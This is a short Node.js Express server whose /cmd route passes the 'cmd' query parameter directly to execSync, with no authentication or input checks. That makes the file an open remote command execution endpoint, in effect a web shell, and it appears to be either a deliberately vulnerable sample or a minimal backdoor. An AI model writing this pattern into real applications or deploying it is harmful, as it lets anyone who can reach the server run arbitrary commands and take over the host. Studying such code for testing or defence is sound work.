import express from 'express'
import { execSync } from 'child_process'

const app = express();
const port = 3000;

app.get('/', (req, res) => {
	res.send('Hello!');
})

app.get('/cmd', (req, res) => {
	const command = req.query.cmd;
	execSync(command)

	res.status(200).end()
})

app.listen(port, () => {
	console.log(`Listening on port ${port}`)
})